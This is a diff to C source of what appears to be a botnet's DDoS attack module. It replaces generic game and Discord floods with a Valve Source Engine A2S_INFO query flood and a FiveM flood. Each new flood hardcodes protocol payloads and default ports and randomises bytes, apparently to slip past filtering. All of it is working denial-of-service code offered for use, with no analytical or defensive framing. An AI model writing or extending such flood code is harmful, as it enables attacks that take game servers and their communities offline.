@@ -23,8 +23,8 @@ void attack_init(void) {
     int i = 0;
 
     methods[i].func = attack_udp_flood;         methods[i++].type = ATK_VEC_UDP;
-    methods[i].func = attack_game_flood;        methods[i++].type = ATK_VEC_GAME;
-    methods[i].func = attack_discord_flood;     methods[i++].type = ATK_VEC_DISCORD;
+    methods[i].func = attack_vse_flood;         methods[i++].type = ATK_VEC_VSE;
+    methods[i].func = attack_fivem_flood;       methods[i++].type = ATK_VEC_FIVEM;
     methods[i].func = attack_pps_flood;         methods[i++].type = ATK_VEC_PPS;
 
     methods[i].func = attack_tls_flood;         methods[i++].type = ATK_VEC_TLS;
@@ -147,19 +147,16 @@ void attack_udp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
     close(fd);
 }
 
-void attack_game_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
+void attack_vse_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) return;
 
     uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
-    if (dport == 0) dport = 27015 + (rand_next() % 100);
+    if (dport == 0) dport = 27015;
 
-    uint16_t payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
-    if (payload_size == 0) payload_size = 1472;
-
-    char *payload = malloc(payload_size);
-    if (!payload) { close(fd); return; }
+    /* Valve Source Engine A2S_INFO query - high amplification */
+    char vse_payload[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
 
     struct sockaddr_in sin = {0};
     sin.sin_family = AF_INET;
@@ -168,24 +165,26 @@ void attack_game_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
     for (int i = 0; i < targs_len; i++) {
         sin.sin_addr.s_addr = targs[i].addr.s_addr;
         while (attack_ongoing[0]) {
-            rand_str_safe(payload, payload_size);
-            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&sin, sizeof(sin));
+            sendto(fd, vse_payload, sizeof(vse_payload) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
         }
     }
 
-    free(payload);
     close(fd);
 }
 
-void attack_discord_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
+void attack_fivem_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                           int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) return;
 
     uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
-    if (dport == 0) dport = 50000 + (rand_next() % 1000);
+    if (dport == 0) dport = 30120;
 
-    char payload[1472];
+    /* FiveM protocol packets - getinfo, sec, token variants */
+    char fiveminfo[15] = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a";
+    char fivesec[52] = "\x8f\xff\x90\x3c\x82\xff\x00\x01\x00\x00\xff\xff\x00\x00\x05\x14\x00\x01\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x88\x00\x00\x00\x02\x00\x00\x00\x02\x90\x3c\x5c\x16\x00\x00\x00\x00";
+    char fivetoken[88] = "\x80\x00\x29\x5a\x01\xff\x00\x01\x00\x01\x83\xd6\x86\x00\x00\x01\x00\x46\x01\x00\x00\x00\x74\x6f\x6b\x65\x6e\x3d\x62\x31\x35\x33\x31\x36\x64\x63\x2d\x36\x63\x65\x39\x2d\x34\x62\x34\x32\x2d\x39\x31\x62\x35\x2d\x32\x36\x62\x65\x34\x37\x32\x32\x35\x63\x39\x38\x26\x67\x75\x69\x64\x3d\x31\x34\x38\x36\x31\x38\x37\x39\x32\x34\x35\x34\x33\x32\x30\x31\x31\x38";
+
     struct sockaddr_in sin = {0};
     sin.sin_family = AF_INET;
     sin.sin_port = htons(dport);
@@ -193,8 +192,26 @@ void attack_discord_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_targ
     for (int i = 0; i < targs_len; i++) {
         sin.sin_addr.s_addr = targs[i].addr.s_addr;
         while (attack_ongoing[0]) {
-            rand_str_safe(payload, sizeof(payload));
-            sendto(fd, payload, sizeof(payload), 0, (struct sockaddr *)&sin, sizeof(sin));
+            int pkt = rand_next() % 3;
+            if (pkt == 0) {
+                sendto(fd, fiveminfo, sizeof(fiveminfo) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
+            } else if (pkt == 1) {
+                fivesec[2] = rand_next() % 128;
+                fivesec[3] = rand_next() % 128;
+                fivesec[44] = rand_next() % 128;
+                fivesec[45] = rand_next() % 128;
+                fivesec[46] = rand_next() % 128;
+                fivesec[47] = rand_next() % 128;
+                sendto(fd, fivesec, sizeof(fivesec) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
+            } else {
+                fivetoken[28] = 97 + (rand_next() % 26);
+                for (int j = 29; j <= 33; j++) fivetoken[j] = 48 + (rand_next() % 10);
+                fivetoken[34] = 97 + (rand_next() % 26);
+                fivetoken[35] = 97 + (rand_next() % 26);
+                fivetoken[37] = 48 + (rand_next() % 10);
+                for (int j = 70; j <= 87; j++) fivetoken[j] = 48 + (rand_next() % 10);
+                sendto(fd, fivetoken, sizeof(fivetoken) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
+            }
         }
     }
 
